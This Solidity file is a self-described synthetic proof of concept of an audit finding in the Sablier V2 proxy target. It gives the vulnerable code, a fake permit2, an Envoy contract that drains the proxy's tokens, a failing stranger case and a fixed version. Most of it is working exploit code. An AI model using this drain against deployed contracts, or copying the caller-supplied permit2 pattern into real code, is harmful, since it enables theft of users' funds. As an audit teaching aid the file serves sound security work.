// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Sablier — an envoy of SablierV2ProxyTarget can drain the proxy
    (Cantina / Zach Obront, finding #54671, July 2023)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    In the real proxy the target runs via delegatecall, so address(this) is the
    proxy. This file keeps that result: the verbatim _transferAndApprove body
    runs on the contract that holds the tokens.

    An envoy is allowed to call the target. They are not the owner and they are
    not approved on the token. The function takes the permit2 address from the
    caller. A dummy permit2 no-ops permit and transferFrom, then _approve lets
    the envoy's sablier contract pull the proxy balance.

    A stranger who was not set as envoy cannot call the target. A fixed target
    rejects any permit2 other than the canonical one. */

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

struct PermitSingle {
    address token;
    uint160 amount;
    uint48 expiration;
    uint48 nonce;
}

interface IPermit2 {
    function permit(address owner, PermitSingle calldata permitSingle, bytes calldata signature) external;
    function transferFrom(address from, address to, uint160 amount, address token) external;
}

struct Permit2Params {
    IPermit2 permit2;
    PermitSingle permitSingle;
    bytes signature;
}

interface ISablier {
    function create(address asset, uint160 amount, address recipient) external;
}

contract AssetToken is IERC20 {
    string public constant name = "Proxy Asset";
    string public constant symbol = "ASSET";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (msg.sender != from) {
            allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract FakePermit2 is IPermit2 {
    function permit(address, PermitSingle calldata, bytes calldata) external {}

    function transferFrom(address, address, uint160, address) external {}
}

contract CanonicalPermit2 is IPermit2 {
    function permit(address, PermitSingle calldata, bytes calldata) external {}

    function transferFrom(address, address, uint160, address) external pure {
        revert("owner signature required");
    }
}

contract FakeSablier is ISablier {
    function create(address asset, uint160 amount, address recipient) external {
        IERC20(asset).transferFrom(msg.sender, recipient, amount);
    }
}

contract SablierV2ProxyTarget {
    address public owner;
    mapping(address => bool) public isEnvoy;
    uint256 public stolenByApprove;

    constructor(address owner_, address envoy_) {
        owner = owner_;
        isEnvoy[envoy_] = true;
    }

    function createStream(
        address sablierContract,
        IERC20 asset,
        uint160 amount,
        Permit2Params calldata permit2Params,
        address recipient
    ) external {
        require(msg.sender == owner || isEnvoy[msg.sender], "envoy");
        _transferAndApprove(sablierContract, asset, amount, permit2Params);
        ISablier(sablierContract).create(address(asset), amount, recipient);
    }

    function _transferAndApprove(
        address sablierContract,
        IERC20 asset,
        uint160 amount,
        Permit2Params calldata permit2Params
    ) internal {
        // Retrieve the proxy owner.
        address owner_ = owner;
        // Permit the proxy to spend funds from the proxy owner.
        permit2Params.permit2.permit({
            owner: owner_,
            permitSingle: permit2Params.permitSingle,
            signature: permit2Params.signature
        });
        // Transfer funds from the proxy owner to the proxy.
        // @> VULN: permit2 is whichever contract the envoy passed, so this pull can no-op
        permit2Params.permit2.transferFrom({ from: owner_, to: address(this), amount: amount, token: address(asset) });
        // Approve the Sablier contract to spend funds.
        _approve(sablierContract, asset, amount);
    }

    function _approve(address sablierContract, IERC20 asset, uint160 amount) internal {
        stolenByApprove = amount;
        asset.approve(sablierContract, amount);
    }
}

contract SablierV2ProxyTargetFixed {
    address public owner;
    address public canonicalPermit2;
    mapping(address => bool) public isEnvoy;

    constructor(address owner_, address envoy_, address canonical_) {
        owner = owner_;
        isEnvoy[envoy_] = true;
        canonicalPermit2 = canonical_;
    }

    function createStream(
        address sablierContract,
        IERC20 asset,
        uint160 amount,
        Permit2Params calldata permit2Params,
        address recipient
    ) external {
        require(msg.sender == owner || isEnvoy[msg.sender], "envoy");
        require(address(permit2Params.permit2) == canonicalPermit2, "permit2");
        permit2Params.permit2.permit({
            owner: owner,
            permitSingle: permit2Params.permitSingle,
            signature: permit2Params.signature
        });
        permit2Params.permit2.transferFrom({ from: owner, to: address(this), amount: amount, token: address(asset) });
        asset.approve(sablierContract, amount);
        ISablier(sablierContract).create(address(asset), amount, recipient);
    }
}

contract Envoy {
    function steal(
        SablierV2ProxyTarget proxy,
        IPermit2 permit2,
        ISablier sablier,
        IERC20 asset,
        uint160 amount,
        address recipient
    ) external {
        Permit2Params memory params = Permit2Params({
            permit2: permit2,
            permitSingle: PermitSingle({ token: address(asset), amount: amount, expiration: 0, nonce: 0 }),
            signature: ""
        });
        proxy.createStream(address(sablier), asset, amount, params, recipient);
    }

    function stealFixed(
        SablierV2ProxyTargetFixed proxy,
        IPermit2 permit2,
        ISablier sablier,
        IERC20 asset,
        uint160 amount,
        address recipient
    ) external {
        Permit2Params memory params = Permit2Params({
            permit2: permit2,
            permitSingle: PermitSingle({ token: address(asset), amount: amount, expiration: 0, nonce: 0 }),
            signature: ""
        });
        proxy.createStream(address(sablier), asset, amount, params, recipient);
    }
}

contract Stranger {
    function steal(
        SablierV2ProxyTarget proxy,
        IPermit2 permit2,
        ISablier sablier,
        IERC20 asset,
        uint160 amount,
        address recipient
    ) external returns (bool opened) {
        Permit2Params memory params = Permit2Params({
            permit2: permit2,
            permitSingle: PermitSingle({ token: address(asset), amount: amount, expiration: 0, nonce: 0 }),
            signature: ""
        });
        try proxy.createStream(address(sablier), asset, amount, params, recipient) {
            opened = true;
        } catch {
            opened = false;
        }
    }
}

contract Owner {}

contract Exploit {
    uint256 public constant PROXY_BALANCE = 1000 ether;

    AssetToken public token; // CREATE nonce 1
    Owner public owner; // CREATE nonce 2
    FakePermit2 public fakePermit2; // CREATE nonce 3
    CanonicalPermit2 public canonical; // CREATE nonce 4
    FakeSablier public sablier; // CREATE nonce 5
    Envoy public envoy; // CREATE nonce 6
    Stranger public stranger; // CREATE nonce 7
    SablierV2ProxyTarget public proxy; // CREATE nonce 8
    SablierV2ProxyTargetFixed public fixedProxy; // CREATE nonce 9

    uint256 public proxyBefore;
    uint256 public attackerAfter;
    uint256 public proxyAfter;
    bool public strangerOpened;

    constructor() {
        token = new AssetToken();
        owner = new Owner();
        fakePermit2 = new FakePermit2();
        canonical = new CanonicalPermit2();
        sablier = new FakeSablier();
        envoy = new Envoy();
        stranger = new Stranger();
        proxy = new SablierV2ProxyTarget(address(owner), address(envoy));
        fixedProxy = new SablierV2ProxyTargetFixed(address(owner), address(envoy), address(canonical));
    }

    function run() external {
        token.mint(address(proxy), PROXY_BALANCE);
        proxyBefore = token.balanceOf(address(proxy));
        strangerOpened = stranger.steal(proxy, fakePermit2, sablier, token, uint160(PROXY_BALANCE), msg.sender);
        envoy.steal(proxy, fakePermit2, sablier, token, uint160(PROXY_BALANCE), msg.sender);
        attackerAfter = token.balanceOf(msg.sender);
        proxyAfter = token.balanceOf(address(proxy));
        require(proxy.isEnvoy(address(envoy)), "envoy not set");
        require(proxy.isEnvoy(address(stranger)) == false, "stranger is envoy");
        require(strangerOpened == false, "stranger opened the target");
        require(proxyBefore == PROXY_BALANCE, "proxy funding");
        require(attackerAfter == PROXY_BALANCE, "attacker did not receive the proxy balance");
        require(proxyAfter == 0, "proxy retained funds");
        require(msg.sender != address(owner), "attacker is the owner");
    }
}
